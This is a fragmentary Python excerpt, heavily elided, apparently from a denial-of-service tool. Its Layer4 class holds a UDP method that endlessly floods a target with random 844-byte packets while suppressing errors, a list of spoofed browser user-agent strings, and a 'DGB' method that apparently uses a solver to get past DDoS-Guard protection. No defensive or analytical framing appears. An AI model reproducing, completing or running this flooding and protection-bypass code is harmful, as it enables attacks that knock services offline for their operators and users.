...
class Layer4(Thread):
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(844), self._target):
                continue
        Tools.safe_close(s)
    ...
    def __init__(self,
        ...
        if not useragents:
            useragents: List[str] = [
                ...
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/2084401 Firefox/69.0',
    ...
    def DGB(self):
        ...
        with suppress(Exception):
            ...
            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 577)):
                    sleep(min(self._rpc, 577) / 100)
